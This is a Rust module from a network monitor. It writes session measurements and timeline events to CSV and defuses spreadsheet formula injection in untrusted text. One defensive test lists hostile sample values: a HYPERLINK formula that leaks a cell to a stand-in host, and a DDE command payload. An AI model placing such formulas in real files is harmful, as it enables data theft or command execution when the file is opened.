//! Session recording to CSV.
//!
//! Rows are *tidy* (one measurement per row) rather than one wide row per
//! sample: targets, hops and resolvers come and go while octomon runs, so a
//! fixed column set would either truncate them or leave a ragged file. Long
//! format pivots trivially in pandas / Excel and loads directly into Grafana.
//!
//! Recording is toggled from the UI; this task owns the file so no file I/O
//! happens on the key-press path or under the state lock.

use std::fmt::Write as _;
use std::sync::{Arc, Mutex};

use tokio::io::AsyncWriteExt;

use crate::app::{AppState, EventItem, LogStatus};
use crate::config::Config;

const HEADER: &str = "timestamp,category,subject,metric,value,unit\n";

pub async fn run(state: Arc<Mutex<AppState>>, cfg: Config) {
    let mut ticker = tokio::time::interval(cfg.sample_interval());
    let mut file: Option<tokio::fs::File> = None;
    // Timeline high-water mark: only events newer than this go into the CSV.
    let mut events_seen: u64 = 0;
    // Same idea for completed speed tests, which get tidy metric rows.
    let mut speed_seen: usize = 0;

    loop {
        ticker.tick().await;
        let wanted = state.lock().unwrap().logging_requested;

        match (wanted, file.is_some()) {
            // Start recording.
            (true, false) => {
                match open().await {
                    Ok((f, path)) => {
                        file = Some(f);
                        let mut s = state.lock().unwrap();
                        // The recording covers from now on; history that predates
                        // it belongs to the events overlay, not this file.
                        events_seen = s.events_total;
                        speed_seen = s.speed_total;
                        s.log = Some(LogStatus {
                            path: path.clone(),
                            rows: 0,
                            started: std::time::Instant::now(),
                        });
                        // No transient notice: the footer-right "● rec →" and
                        // the header REC badge are the live feedback, and the
                        // notice slot must stay free for the analysis line.
                        s.push_event(
                            crate::verdict::Severity::Info,
                            crate::app::EventCategory::Logging,
                            format!("recording → {}", path.display()),
                        );
                    }
                    Err(e) => {
                        crate::errlog::log("recording", format!("could not open the CSV: {e}"));
                        let mut s = state.lock().unwrap();
                        s.logging_requested = false;
                        s.notice_event(
                            crate::verdict::Severity::Info,
                            crate::app::EventCategory::Logging,
                            format!("could not start recording: {e}"),
                        );
                    }
                }
                continue; // first row on the next tick
            }
            // Stop recording.
            (false, true) => {
                if let Some(mut f) = file.take() {
                    let _ = f.flush().await;
                }
                let mut s = state.lock().unwrap();
                if let Some(status) = s.log.take() {
                    s.push_event(
                        crate::verdict::Severity::Info,
                        crate::app::EventCategory::Logging,
                        format!(
                            "recording stopped — {} rows → {}",
                            status.rows,
                            status.path.display()
                        ),
                    );
                }
                continue;
            }
            (false, false) => continue,
            (true, true) => {}
        }

        // Snapshot and format under the lock, write outside it.
        let (body, rows) = {
            let s = state.lock().unwrap();
            let stamp = chrono::Local::now().to_rfc3339();
            let mut body = format_rows(&s, &stamp);
            body.push_str(&format_speedtests(&s, &stamp, &mut speed_seen));
            body.push_str(&format_events(&s, &stamp, &mut events_seen));
            let rows = body.lines().count() as u64;
            (body, rows)
        };

        if let Some(f) = file.as_mut() {
            if let Err(e) = f.write_all(body.as_bytes()).await {
                crate::errlog::log(
                    "recording",
                    format!("write failed, recording stopped: {e} ({rows} rows lost)"),
                );
                let mut s = state.lock().unwrap();
                s.logging_requested = false;
                s.notice = Some("recording failed — write error".to_string());
                continue;
            }
            let _ = f.flush().await;
            let mut s = state.lock().unwrap();
            if let Some(status) = s.log.as_mut() {
                status.rows += rows;
            }
        }
    }
}

/// Create the session file and write its header.
async fn open() -> Result<(tokio::fs::File, std::path::PathBuf), String> {
    let path = crate::store::session_log_path().ok_or("no data directory")?;
    if let Some(dir) = path.parent() {
        crate::store::create_dir_private(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    }
    let mut opts = tokio::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    // tokio's OpenOptions carries its own `mode`, so no std trait import here.
    opts.mode(crate::store::FILE_MODE);
    let mut f = opts.open(&path).await.map_err(|e| e.to_string())?;
    f.write_all(HEADER.as_bytes())
        .await
        .map_err(|e| e.to_string())?;
    Ok((f, path))
}

/// One CSV row per measurement in this snapshot.
fn format_rows(s: &AppState, stamp: &str) -> String {
    let mut out = String::new();
    let mut row = |cat: &str, subject: &str, metric: &str, value: String, unit: &str| {
        let _ = writeln!(
            out,
            "{stamp},{cat},{},{metric},{value},{unit}",
            field(subject)
        );
    };

    // ICMP targets.
    let n = s.window_samples();
    for t in &s.targets {
        let st = t.stats(n);
        if let Some(v) = t.last_rtt_ms {
            row("target", &t.label, "rtt_ms", format!("{v:.3}"), "ms");
        }
        if let Some(v) = st.mean {
            row("target", &t.label, "rtt_mean_ms", format!("{v:.3}"), "ms");
        }
        if let Some(v) = st.p95 {
            row("target", &t.label, "rtt_p95_ms", format!("{v:.3}"), "ms");
        }
        row(
            "target",
            &t.label,
            "loss_pct",
            format!("{:.2}", t.recent_loss_pct(n)),
            "%",
        );
        row(
            "target",
            &t.label,
            "jitter_ms",
            format!("{:.3}", t.jitter_ms),
            "ms",
        );
    }

    // Path monitor, keyed by address so a re-routed hop is distinguishable.
    if let Some(m) = &s.hop_monitor {
        for h in &m.hops {
            let Some(st) = &h.stat else { continue };
            let subject = h.addr.map(|a| a.to_string()).unwrap_or_default();
            row("hop", &subject, "ttl", h.ttl.to_string(), "");
            if let Some(v) = st.last_rtt_ms {
                row("hop", &subject, "rtt_ms", format!("{v:.3}"), "ms");
            }
            row(
                "hop",
                &subject,
                "loss_pct",
                format!("{:.2}", st.recent_loss_pct(n)),
                "%",
            );
        }
    }

    // Throughput. Skipped until an interface is known, rather than emitting
    // rows with an empty subject that can't be attributed on import.
    let tp = &s.throughput;
    if !tp.iface.is_empty() {
        row(
            "throughput",
            &tp.iface,
            "down_bps",
            format!("{:.0}", tp.down_bps),
            "B/s",
        );
        row(
            "throughput",
            &tp.iface,
            "up_bps",
            format!("{:.0}", tp.up_bps),
            "B/s",
        );
    }

    // DNS resolvers.
    for p in &s.dns {
        let subject = p.server.to_string();
        if let Some(v) = p.last_ms {
            row("dns", &subject, "rtt_ms", format!("{v:.3}"), "ms");
        }
        row(
            "dns",
            &subject,
            "fail_pct",
            format!("{:.2}", p.fail_pct()),
            "%",
        );
    }

    // Wi-Fi radio, when it is the medium in use.
    if s.signal.present {
        row(
            "wifi",
            &s.netinfo.iface,
            "rssi_dbm",
            s.signal.rssi_dbm.to_string(),
            "dBm",
        );
        // Empty where the platform measures no noise floor: a blank cell reads
        // as "not measured" to anything consuming the CSV, where 0 would be
        // averaged in as a reading.
        row(
            "wifi",
            &s.netinfo.iface,
            "noise_dbm",
            s.signal
                .noise_dbm
                .map(|n| n.to_string())
                .unwrap_or_default(),
            "dBm",
        );
        row(
            "wifi",
            &s.netinfo.iface,
            "tx_rate_mbps",
            format!("{:.0}", s.signal.tx_rate_mbps),
            "Mbps",
        );
    }

    // Per-process talkers. The list is a session ranking, so processes that
    // are idle right now are on it too; they have nothing to log this tick.
    for p in s.processes.iter().filter(|p| p.down_bps + p.up_bps > 0.0) {
        row(
            "process",
            &p.name,
            "down_bps",
            format!("{:.0}", p.down_bps),
            "B/s",
        );
        row(
            "process",
            &p.name,
            "up_bps",
            format!("{:.0}", p.up_bps),
            "B/s",
        );
    }

    // Machine vitals, for correlating "the network is slow" with a busy box.
    let v = &s.vitals;
    row("machine", "", "cpu_pct", format!("{:.1}", v.cpu_pct), "%");
    row("machine", "", "mem_used_bytes", v.mem_used.to_string(), "B");

    out
}

/// Speed tests completed since the high-water mark, as tidy metric rows.
/// The timeline events say a test started and what it found as text; these
/// carry the same results as numbers a CSV import can chart. The provider is
/// the subject, matching how the results panel attributes them.
fn format_speedtests(s: &AppState, stamp: &str, seen: &mut usize) -> String {
    let mut out = String::new();
    let new = s
        .speed_total
        .saturating_sub(*seen)
        .min(s.speed_history.len());
    for r in s.speed_history.iter().skip(s.speed_history.len() - new) {
        let mut row = |metric: &str, value: String, unit: &str| {
            let _ = writeln!(
                out,
                "{stamp},speedtest,{},{metric},{value},{unit}",
                field(&r.provider)
            );
        };
        row("down_mbps", format!("{:.1}", r.down_mbps), "Mbps");
        row("up_mbps", format!("{:.1}", r.up_mbps), "Mbps");
        // Idle-vs-loaded is the bufferbloat measurement; blank cells read as
        // "not measured" on import, matching the Wi-Fi noise convention.
        if let Some(v) = r.idle_ms {
            row("idle_latency_ms", format!("{v:.1}"), "ms");
        }
        if let Some(v) = r.loaded_ms {
            row("loaded_latency_ms", format!("{v:.1}"), "ms");
        }
    }
    *seen = s.speed_total;
    out
}

/// Timeline events newer than the high-water mark, one row each. Events are
/// text, not measurements, so the message rides in the value column (quoted)
/// with the severity as the metric: `…,event,verdict,degraded,"▲ …",`.
fn format_events(s: &AppState, stamp: &str, seen: &mut u64) -> String {
    let mut out = String::new();
    let new = (s.events_total.saturating_sub(*seen) as usize).min(s.events.len());
    for e in s.events.iter().skip(s.events.len() - new) {
        let _ = writeln!(
            out,
            "{stamp},event,{},{},{},",
            e.category.label(),
            e.severity.label(),
            field(&e.message)
        );
    }
    *seen = s.events_total;
    out
}

/// The event timeline as its own CSV, for the [x] export in the events
/// overlay: one row per event, oldest first, so it reads top-to-bottom like a
/// log. Timestamps are local RFC 3339, matching the session recording, so the
/// two files line up if both are opened.
pub fn format_events_export(events: impl IntoIterator<Item = EventItem>) -> String {
    use chrono::{Local, TimeZone};
    let mut out = String::from("timestamp,category,severity,message\n");
    for e in events {
        let stamp = Local
            .timestamp_opt(e.at, 0)
            .single()
            .map(|dt| dt.to_rfc3339())
            .unwrap_or_default();
        let _ = writeln!(
            out,
            "{stamp},{},{},{}",
            e.category.label(),
            e.severity.label(),
            field(&e.message)
        );
    }
    out
}

/// Write the timeline to a fresh file in the config folder and return its
/// path. Blocking; run it off the UI path.
pub fn export_events(events: Vec<EventItem>) -> Result<std::path::PathBuf, String> {
    let path = crate::config::Config::events_export_path().ok_or("no config directory")?;
    if let Some(dir) = path.parent() {
        crate::store::create_dir_private(dir).map_err(|e| e.to_string())?;
    }
    crate::store::write_private(&path, format_events_export(events)).map_err(|e| e.to_string())?;
    Ok(path)
}

/// Quote a CSV field when it contains anything that would break parsing, and
/// defuse it when a spreadsheet would read it as a formula.
///
/// Only text goes through here — target labels, process names, event messages —
/// and none of it is ours. A process name comes from whatever is running, and
/// an SSID comes from whoever owns the nearest access point, so a field can
/// start with `=`, `+`, `-` or `@` on purpose: Excel and Sheets treat those as
/// the start of a formula, and `=HYPERLINK("http://…"&A1)` in a recording or in
/// the bundle's events.csv would fire when the file is opened. A leading
/// apostrophe is the standard defusal — the cell still reads as the original
/// text, and every CSV parser that isn't a spreadsheet sees one extra
/// character rather than a different value.
pub fn field(v: &str) -> String {
    // Tab and carriage return count: a formula can be hidden behind leading
    // whitespace that the spreadsheet strips before parsing.
    let risky = v.starts_with(['=', '+', '-', '@', '\t', '\r']);
    let quote = v.contains([',', '"', '\n', '\r']);
    match (risky, quote) {
        (false, false) => v.to_string(),
        (false, true) => format!("\"{}\"", v.replace('"', "\"\"")),
        // A defused field is always quoted: the apostrophe has to survive
        // whatever else is in there, and quoting it is never wrong.
        (true, _) => format!("\"'{}\"", v.replace('"', "\"\"")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::app::TargetStat;
    use std::net::{IpAddr, Ipv4Addr};

    #[test]
    fn fields_with_separators_are_quoted() {
        assert_eq!(field("Safari"), "Safari");
        assert_eq!(field("my target, home"), "\"my target, home\"");
        assert_eq!(field("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(field("line\nbreak"), "\"line\nbreak\"");
    }

    /// An SSID is broadcast by whoever owns the access point, and a process
    /// name by whatever is running: both reach a CSV people open in Excel.
    #[test]
    fn spreadsheet_formulas_are_defused() {
        for evil in [
            "=HYPERLINK(\"http://x/\"&A1)",
            "+1+1",
            "-2+3",
            "@SUM(A1)",
            "\t=cmd|'/c calc'!A1",
        ] {
            let out = field(evil);
            assert!(out.starts_with("\"'"), "{evil} → {out}");
        }
        // The quoting inside a defused field still escapes quotes.
        assert_eq!(field("=\"x\""), "\"'=\"\"x\"\"\"");
        // And ordinary text keeps its exact value, apostrophe-free.
        assert_eq!(field("192.168.1.1"), "192.168.1.1");
        assert_eq!(field("hop 2→1.1.1.1"), "hop 2→1.1.1.1");
    }

    #[test]
    fn rows_are_tidy_and_parseable() {
        let mut s = AppState::new(vec![TargetStat::new(
            "Cloudflare".into(),
            IpAddr::V4(Ipv4Addr::new(1, 1, 1, 1)),
        )]);
        s.targets[0].record_reply(12.5);
        s.throughput.iface = "en0".into();
        s.throughput.down_bps = 2048.0;

        let out = format_rows(&s, "2026-08-10T21:00:00+01:00");
        // Every row carries the six columns of the header.
        for line in out.lines() {
            assert_eq!(
                line.matches(',').count(),
                5,
                "row should have 6 fields: {line}"
            );
            assert!(line.starts_with("2026-08-10T21:00:00+01:00,"));
        }
        assert!(out.contains(",target,Cloudflare,rtt_ms,12.500,ms"));
        assert!(out.contains(",throughput,en0,down_bps,2048,B/s"));
        assert!(out.contains(",machine,,cpu_pct,"));
    }

    /// Events go to CSV exactly once, past a high-water mark, message quoted.
    #[test]
    fn events_drain_once_past_the_watermark() {
        let mut s = AppState::new(vec![]);
        s.push_event(
            crate::verdict::Severity::Degraded,
            crate::app::EventCategory::Analysis,
            "▲ gateway, unresponsive".into(),
        );

        let mut seen = 0;
        let out = format_events(&s, "T", &mut seen);
        assert_eq!(
            out,
            "T,event,analysis,degraded,\"▲ gateway, unresponsive\",\n"
        );
        assert_eq!(seen, 1);

        // Nothing new: nothing written, even though the event is still held.
        assert!(format_events(&s, "T", &mut seen).is_empty());

        s.push_event(
            crate::verdict::Severity::Info,
            crate::app::EventCategory::Network,
            "VPN down".into(),
        );
        let out = format_events(&s, "T", &mut seen);
        assert_eq!(out.lines().count(), 1);
        assert!(out.contains("network,info,VPN down"));
    }

    /// Speed-test results land in the CSV exactly once, as numeric rows.
    #[test]
    fn speedtest_results_drain_once_past_the_watermark() {
        let mut s = AppState::new(vec![]);
        let mut seen = 0;
        assert!(format_speedtests(&s, "T", &mut seen).is_empty());

        s.speed_history.push(crate::store::SpeedRecord {
            at: 1_700_000_000,
            provider: "Cloudflare".into(),
            down_mbps: 953.24,
            up_mbps: 941.9,
            idle_ms: Some(4.2),
            loaded_ms: Some(122.6),
            network: Some("Home".into()),
            medium: Some("Ethernet (wired)".into()),
            server: None,
        });
        s.speed_total += 1;

        let out = format_speedtests(&s, "T", &mut seen);
        assert!(out.contains("T,speedtest,Cloudflare,down_mbps,953.2,Mbps"));
        assert!(out.contains("T,speedtest,Cloudflare,up_mbps,941.9,Mbps"));
        assert!(out.contains("T,speedtest,Cloudflare,idle_latency_ms,4.2,ms"));
        assert!(out.contains("T,speedtest,Cloudflare,loaded_latency_ms,122.6,ms"));
        // Same six-column shape as every other row.
        for line in out.lines() {
            assert_eq!(line.matches(',').count(), 5, "row: {line}");
        }

        // Already recorded: the next tick writes nothing.
        assert!(format_speedtests(&s, "T", &mut seen).is_empty());
    }

    /// The [x] export: header, oldest first, message quoted when it needs it.
    #[test]
    fn events_export_is_a_standalone_csv_oldest_first() {
        let ev = |at: i64, msg: &str| EventItem {
            at,
            severity: crate::verdict::Severity::Info,
            category: crate::app::EventCategory::Network,
            message: msg.into(),
        };
        let out = format_events_export(vec![
            ev(1_700_000_000, "VPN down"),
            ev(1_700_000_060, "network changed → en7, gateway 10.0.0.1"),
        ]);
        let lines: Vec<&str> = out.lines().collect();
        assert_eq!(lines[0], "timestamp,category,severity,message");
        assert_eq!(lines.len(), 3);
        assert!(lines[1].ends_with(",network,info,VPN down"));
        // The comma in the message is quoted, so a reader sees four columns.
        assert!(lines[2].ends_with(",network,info,\"network changed → en7, gateway 10.0.0.1\""));
        // Timestamps are RFC 3339 with an offset, like the session recording.
        assert!(lines[1].starts_with("2023-11-14T"));
        assert!(lines[1].split(',').next().unwrap().len() >= 25);
    }

    /// A label containing a comma must not shift every later column.
    #[test]
    fn awkward_labels_do_not_corrupt_the_row() {
        let mut s = AppState::new(vec![TargetStat::new(
            "home, office".into(),
            IpAddr::V4(Ipv4Addr::LOCALHOST),
        )]);
        s.targets[0].record_reply(1.0);
        let out = format_rows(&s, "T");
        let row = out
            .lines()
            .find(|l| l.contains("rtt_ms"))
            .expect("a target row");
        assert!(row.contains("\"home, office\""));
        // Quoted comma is inside the field, so the row still has 6 columns.
        assert_eq!(row.matches(',').count(), 6); // 5 separators + 1 quoted
    }
}
